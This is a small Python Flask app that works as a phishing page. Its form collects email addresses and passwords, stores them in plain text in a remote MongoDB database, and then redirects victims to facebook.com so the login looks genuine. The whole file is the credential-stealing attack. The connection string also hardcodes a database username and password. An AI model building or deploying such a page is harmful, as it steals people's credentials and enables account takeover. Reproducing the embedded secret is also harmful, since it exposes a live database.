from crypt import methods
from flask import Flask, render_template, request, redirect, url_for
from pymongo import MongoClient

def create_app():
    app = Flask(__name__)
    client = MongoClient("mongodb+srv://eddie:1250@hackseycluster.5ybokol.mongodb.net/test")
    app.db = client.hackseycluster
    entrie = []

    @app.route('/', methods=["POST", "GET"])
    def home():
        if request.method == "POST":
            Email = request.form.get("Email")
            Password = request.form.get("Password")
            data = {"email":Email, "password":Password}
            app.db.entrie.insert_one(data)

            return redirect("https://www.facebook.com")
        return render_template('index.html')

    @app.route('/www.facebook.com')
    def thankyou():
        return render_template('thankyou.html')
    return app
